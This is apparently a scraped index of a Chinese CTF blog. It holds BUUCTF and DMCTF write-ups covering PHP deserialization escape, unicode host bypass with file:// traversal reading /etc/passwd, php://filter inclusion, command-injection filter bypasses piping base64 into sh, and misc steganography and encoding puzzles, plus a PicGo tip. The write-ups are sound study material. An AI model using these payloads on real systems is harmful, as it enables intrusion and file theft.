","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#ciscn-2019-初赛love-math"},{"categories":["CTF"],"content":"[0CTF 2016]piapiapia使用目录扫描发现了www.zip网站备份。 网站结构 static upload class.php config.php index.php profile.php register.php update.php 发现有register就去注册个试试呗 注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号 邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是： \u003cimg src=\"data:image/gif;base64,....... 查看源码profile.php中是这样的 $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); 读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了unserialize，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地 \u003c?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = ''; ?\u003e 下载的源码肯定不会把flag直接给你，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：filter $username = parent::filter($username); $password = parent::filter($password); 跟进一下 public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); } 过滤_，select、insert、update、delete、where会被替换成hacker，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用PHP反序列化字符串逃逸，序列化的结尾是\";}可以手动构造闭合。 现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工 先上payload wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} ⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。 受到了这位师傅的博客[0CTF 2016]piapiapia，我尝试了下$profile属性其实是一个关联数组，是键值对形式的，并且字符串可能是嵌套起来的，形如 \u003c?php class profile{ public $file = 'a:2:{s:8:\"nickname\";s:5:\"where\";s:5:\"photo\";s:3:\"233\";}'; public $upload =\"2333\"; } $s1= new profile(); echo serialize($s1); 结果是 O:7:\"profile\":2:{s:4:\"file\";s:56:\"a:2:{s:8:\"nickname\";s:15:\"where\";s:5:\"photo\";s:3:\"233\";}\";s:6:\"upload\";s:4:\"2333\";} 这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。 报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。 查看页面的图片内容 base64解码 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#0ctf-2016piapiapia"},{"categories":["CTF"],"content":"[SUCTF 2019]Pythonginx整理一下源码 def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 三个if都是判断host == 'suctf.cc'，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断==，回过头来注意到了第二个if中有newhost.append(h.encode('idna').decode('utf-8'))进行了一波编码，那么问题就出在了这里。 所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母c，那么我就找第一个字母s验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，需要多试几个。 我选出的是这个字符𝐬，我们先使用url编码一下防止参数出现错误，尝试读一下passwd： /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd flag并不在其中，并且也不再根目录下，根据题目中有nginx应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到： 配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 读配置文件 /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf 读flag /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag 参考的博客链接： https://www.xmsec.cc/suctf19-wp/ https://xz.aliyun.com/t/6042#toc-24 https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019pythonginx"},{"categories":["CTF"],"content":"[BSidesCF 2020]Had a bad day看这个标题我推一下OWRLD ORDER的Have a nice day 页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为 /index.php?category=woofers 尝试输入flag会显示 只能有woofers和meowers可以通过，尝试了下php的filter伪协议读文件 读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用： \u003ccenter\u003e \u003ch4\u003e Woof! Woof! \u003c/h4\u003e \u003c/center\u003e \u003cimg style=\"width:100%\" src=\"img/dog/\u003c?php echo rand(1,10)?\u003e.jpg\"\u003e 多尝试以后发现可以读index，下面是主要的源码： \u003c?php $file = $_GET['category']; if(isset($file)){ if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?\u003e 可以看到if判断中需要字符串包含woofers、meowers、index，那么我们只需要在filter伪协议中插入字符串绕过判断即可。 需要知道的：filter可以设定一个或多个过滤器名称，以管道符\\分隔，所以构造payload： /index.php?category=php://filter/meowers/convert.base64-encode/resource=flag 读出来以后解密即可获得flag 搜索的时候学到了一个其他的截断 zip://test.zip#hello.html.php 代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bsidescf-2020had-a-bad-day"},{"categories":["DROPS"],"content":"[GXYCTF2019]Ping Ping Ping题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping 和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用： ?ip=127.0.0.1|ls 目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格： $IFS ${IFS} $IFS$1 //$1改成$加其他数字貌似都行 \u003c \u003c\u003e {cat,flag.php} //用逗号实现了空格功能 %20 %09 在linux下反单引号里面的指令会被执行 `ls` ?ip=|cat$IFS`ls` 会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤： /?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){ echo preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match); die(\"fxck your symbol!\"); } else if(preg_match(\"/ /\", $ip)){ die(\"fxck your space!\"); } else if(preg_match(\"/bash/\", $ip)){ die(\"fxck your bash!\"); } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){ die(\"fxck your flag!\"); } $a = shell_exec(\"ping -c 4 \".$ip); echo \" \"; print_r($a); } ?\u003e 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行： ?ip=|cat$IFS`ls` 这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。 最后记录下学到的姿势和这道题目的其他思路： 管道符： |直接执行后面的语句。 ||如果前面语句错误，执行后面的语句。 \u0026前面和后面命令都要执行，无论前面真假， \u0026\u0026如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 使用以下绕过空格： $IFS ${IFS} ${IFS}$1 $IFS$1 //$1改成$加其他数字貌似都行 \u003c \u003c\u003e {cat,flag.php} //用逗号实现了空格功能 %20 %09 //需要php环境 覆盖源码里的$a变量（拼接变量）： /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 使用sh执行脚本： /?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行： /?ip=|cat$IFS`ls` 附：大佬整理的博客（内含更多姿势）：命令执行漏洞利用及绕过方式总结 ","date":"2020-12-04","objectID":"/posts/gxyctf2019ping-ping-ping/:0:0","series":null,"tags":["Web","BUUCTF_Web","RCE"],"title":"GXYCTF2019 Ping Ping Ping","uri":"/posts/gxyctf2019ping-ping-ping/#gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"前言这次比赛是第一次做Mics的题awa。 ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:0:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#前言"},{"categories":["CTF"],"content":"Misc","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:0:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#misc"},{"categories":["CTF"],"content":"Check_in真·有手就行 ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:1:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#check_in"},{"categories":["CTF"],"content":"fakezip看到题目fakezip翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：zip伪加密，使用010 Editor打开压缩包， 找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt 打开以后内容是：♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=，音符加密虽然是第一次听说，但是百度还是可以简单找到：文本加密为音乐符号 ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:2:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#fakezip"},{"categories":["CTF"],"content":"Base family题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：base16、base32、base58、base64、base91。还有几种没听过的base种类可以在这个网站找到：CTF在线工具。 原层： XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0\u0026whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td\"^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf\u0026GP\u003cRk:o_Jk\u003cJ.zp8%H0g7sYSTJ9p.\"duRBGj`g0!I+xjm(fh)]IF:\u003eomN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=\u003cD base91解码： 3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW base58解码： JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 base32解码： NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q= base64解码： 666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d hex解码： flag{y0u_alr3ady_kn0w_th3_Basefam1ly} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:3:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#base-family"},{"categories":["CTF"],"content":"SlientEye根据题目直接百度SlientEye，下载以后打开图片–\u003edecode： 参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt： \u0026#102;\u0026#108;\u0026#97;\u0026#103;\u0026#123;\u0026#110;\u0026#49;\u0026#95;\u0026#98;\u0026#117;\u0026#95;\u0026#106;\u0026#49;\u0026#97;\u0026#110;\u0026#103;\u0026#95;\u0026#119;\u0026#117;\u0026#95;\u0026#100;\u0026#51;\u0026#125; 再去百度搜到一篇博客：\u0026#x开头的是什么编码?，我点开一看，哦，原来是entity code实体编码，我啪的一下就把flag.txt改为flag.html，很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳打开flag.html获得flag：flag{n1_bu_j1ang_wu_d3} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:4:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#slienteye"},{"categories":["CTF"],"content":"编码之王下载文件打开后一堆社会主义核心价值观，前面提到的：CTF在线工具就有核心价值观编码，下面放密文，上面是解码内容。 解出来以后看到第一句：如是我闻:，–\u003e与佛论禅 再解之后看第一句：新佛曰：。–\u003e新与佛论禅 解完以后直接出了一堆由：[、]、!、+、(、)组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:5:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#编码之王"},{"categories":["CTF"],"content":"jpgsteg题目即是用到的工具，百度下载软件，使用jphide.exe打开图片Tap code.jpg，选择seek功能解密，密码为123456（我蒙的）： 成功解密后获得一个文档，内容如下： ... .... .. ... .. ... . . ... .. . . ..... ..... .. .... ... ... .. .. 这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的.分成两部分代表坐标 解码得到：ohhamazing ，加上括号就是：flag{ohhamazing} 事后多看了一眼图片命名：Tap code.jpg。这用啥解密不就在脸上写着的wosabi \\0/。。。 ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:6:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#jpgsteg"},{"categories":["CTF"],"content":"Collision打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样： 所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：crc32碰撞 ctf python作者原创的脚本： import string import threading import binascii import sys def crc(_crc): l = 1 dic = string.printable _input = _crc _input = \"0X\" + _input for i in dic: for n in dic: for h in dic: for m in dic: s = i + n + h + m s = s.encode() # print(str(binascii.crc32(s)), _input) if hex(binascii.crc32(s)).upper() == _input.upper(): print(_crc, ':', s.decode()) print(l) sys.exit() #直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复 l = l + 1 def crc32(): print(\"四字节碰撞!!!\") num = int(input(\"你可能需要多个线程同时进行碰撞，请输入线程数：\")) _thread = [] _args = [] print(\"输入参数\") for i in range(num): print(i+1, end=':') _args.append(input()) # print(_args) for i in range(num): t = threading.Thread(target=crc, args=(_args[i],)) _thread.append(t) #如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试 # print(_thread) for i in range(num): _thread[i].start() for i in range(num): _thread[i].join() input() if __name__ == '__main__': crc32() 使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为： ff92876d 6c4a558b 77e8fd00 1e59a66e d1f4eb9a 碰撞以后获得的明文： 1on} 32co llis flag {crc 根据flag的结构拼接一下：flag{crc32collis1on} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:7:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#collision"},{"categories":["CTF"],"content":"kaomoji题目的压缩包解压以后得到一个flag.zip压缩包和secret.txt，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用winrar压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的： 配合ARCHPR使用明文攻击，获得加密密钥： [b00df998 5bdbbde6 485fa1f8] 我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包flag_decrypted.zip，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:8:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#kaomoji"},{"categories":["CTF"],"content":"ARCHPR题目根据提示：This file was encrypted by me with a four-digit password, try to crack it! 密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下： The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase. key: .--. .- ... ... .-- --- .-. -.. 提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：password，使用LSB（项目地址）脚本执行： python lsb.py extract flag.png 1.txt password 1.txt中就包含了解密以后的flag：flag{th1s_15_f1agggggg} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:9:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#archpr"},{"categories":["CTF"],"content":"outguess​ 看题目找工具，使用outguess参考隐写工具outguess 的下载安装及使用，在kali中安装以后执行 outguess -r flag.jpg hide.txt 获得hide.txt文件的内容： Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg! Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+ 上面一段使用凯撒密码移动13位获得：Do you know AES? The key is s3cur1ty, go and crack it! 其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是s3cur1ty，获得flag：flag{y0u_ar3_awes0m3} 解密网站：https://tool.oschina.net/encrypt ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:10:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#outguess"},{"categories":["CTF"],"content":"Whitespace题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码： 这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。 在whitespace网站中粘贴密文点上面的run： 解密获得：password is BlindWaterMark! 输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt： Do you see any difference between the two pictures? Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding. 上传文档 你看这两幅画有什么不同吗？ 了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。 根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了盲水印技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行： python bwn.py decode 2.png 1.png 3.png 获得解密图片： 图片中的内容为： 296969a5695 6696a6a9a69 5669595a566 965696666aa 69596a9666a a6a6569955a 5a66aa69a56 9566a6a6aa6 就百度曼切斯特编码解码，找到一篇博客：一些CTF编码脚本，在里面找到了这两段： 心里一顿狂喜，因为都是2965a这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本 import sys s = '296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6' #这是前面图片里的内容 s=bin(int(s,16)) r=\"\" for i in range(len(s)/2): if s[i*2:i*2+2] == '10': r += '1' else: r += '0' print hex(int(r,2))[2:-1].decode('hex') 执行脚本后获得flag：flag{ab1de_by_th3_law} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:11:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#whitespace"},{"categories":["CTF"],"content":"Steghide题目即工具。参考博客隐写工具Steghide，在kali中安装Steghide后执行： steghide.exe extract -sf trump.jpg 会提示Enter passphrase:直接回车表示空密码，获得flag.txt，打开以后里面都是由¿ ¡ .组成的密文，和Ook的另一种编码：short Ook类似也是只用? ! .组成，把叹号和问号全部替换反过来¡---\u003e! ¿---\u003e?，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：flag{y0u_ar3_clev3r} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:12:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#steghide"},{"categories":["CTF"],"content":"SSTV题目既是工具。搜索SSTV百度百科： 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。 了解到是一种无线电传递图片的方法，搜到的博客慢扫描电视 SSTV和B站的视频慢扫描电视SSTV，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：DMCTF{SSTV,yyds?} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:13:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#sstv"},{"categories":["CTF"],"content":"SimpleQrcode​ 下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）： DM CT F{ Qr Co de _1 s_ so _i nt er es ti ng !! !} 参考下题目标题和flag格式，拼接后获得flag：DMCTF{QrCode_1s_so_interesting!!!} ","date":"2020-12-01","objectID":"/posts/dmctf%E4%B9%8Bmisc/:14:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/dmctf%E4%B9%8Bmisc/#simpleqrcode"},{"categories":["瞎折腾"],"content":"前言现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述： PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具 PicGo 本体支持如下图床： 七牛图床 v1.0 腾讯云 COS v4\\v5 版本 v1.1 \u0026 v1.5.0 又拍云 v1.2.0 GitHub v1.5.0 SM.MS V2 v2.3.0-beta.0 阿里云 OSS v1.6.0 Imgur v1.6.0 本体不再增加默认的图床支持。你可以自行开发第三方图床插件。 项目地址：PicGo 软件界面： ","date":"2020-11-30","objectID":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#前言"},{"categories":["瞎折腾"],"content":"起因PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含$url参数，也就是默认的url地址： 起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。 ","date":"2020-11-30","objectID":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#起因"},{"categories":["瞎折腾"],"content":"解决方法在软件设置的配置文件里找到了customLink，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。","date":"2020-11-30","objectID":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#解决方法"},{"categories":["瞎折腾"],"content":"结语软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了$filename变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是png格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接Crtl+Shift+i，把图片链接贴里面就彳亍了。白嫖真爽","date":"2020-11-30","objectID":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#结语"},{"categories":["瞎折腾"],"content":"2022-1-31 11:43:48这时候发现自定义链接直接用markdown格式就更好了 ![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png) ","date":"2020-11-30","objectID":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:1:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#2022-1-31-114348"},{"categories":["CTF"],"content":"前言比赛地址：http://dmctf.vaala.cloud:81 这次先写Web题目部分，我最后的排名： ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:0:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#前言"},{"categories":["CTF"],"content":"Web","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:0:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#web"},{"categories":["CTF"],"content":"weak_type源码： PHP \u003c?php show_source(__FILE__); include('class.php'); //level1 if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"202020020\"){ die(\"no no no!\"); } if(intval($num,0)===202020020){ echo \"\u003cbr\u003e level 1 Ok \u003cbr\u003e\"; }else{ 